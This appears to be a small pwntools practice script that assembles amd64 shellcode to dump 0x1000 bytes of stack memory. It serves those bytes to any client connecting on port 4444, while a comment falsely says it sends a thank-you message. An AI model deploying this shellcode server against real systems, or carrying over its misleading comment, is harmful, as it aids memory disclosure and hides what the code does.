import socket
from pwn import *

shellcode = asm(f"""
mov eax, 1
mov edi, 0
mov rsi, rsp
mov rdx, 0x1000
syscall
""", arch='amd64')


def start_server():
    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Get local machine name
    host = '0.0.0.0'
    port = 4444

    # Bind to the port
    server_socket.bind((host, port))

    # Queue up to 5 requests
    server_socket.listen(5)

    print(f"Server started. Listening on {host}:{port}")

    while True:
        # Establish a connection
        client_socket, addr = server_socket.accept()
        print(f"Got a connection from {addr}")

        # Send a thank you message to the client
        message = 'Thank you for connecting'
        client_socket.send(shellcode)
        print(client_socket.recv(1000))

        # Close the connection
        client_socket.close()


if __name__ == '__main__':
    start_server()
